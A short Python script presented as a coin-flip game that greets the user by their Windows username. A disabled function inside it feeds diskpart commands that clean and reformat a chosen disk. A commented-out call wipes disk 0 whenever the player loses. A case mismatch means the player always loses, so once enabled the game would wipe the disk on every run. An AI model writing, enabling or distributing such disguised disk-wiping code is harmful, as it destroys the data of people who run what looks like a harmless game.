import os
import time
import random

''' WARNING
import subprocess

#Replace the disk number with the desired one.
def kill_disk(disk):
    command = f"echo select disk {disk} & echo clean & echo create partition primary & echo format fs=ntfs quick & echo assign letter=D & echo exit"
    subprocess.run(["diskpart"], input=bytes(command, "utf-8"), shell=True)
'''

options = ['Head', 'Tail']
result = random.choice(options)
username = os.getenv("USERNAME")

print(f"Hi Mr. {username}, and welcome to HEAD OR TAIL!!!")
print(f"Everyone loves this game, what about you, {username}?")


print("Come on, it'll be funny...")
print("Do you want to play with me at this game")

choice = input("Head or Tail? ").lower()

if(choice == result):
    print(f"You Won! He's out {result}")
else:
    print(f"You Lose! He's out {result}")
    #kill_disk(0)
    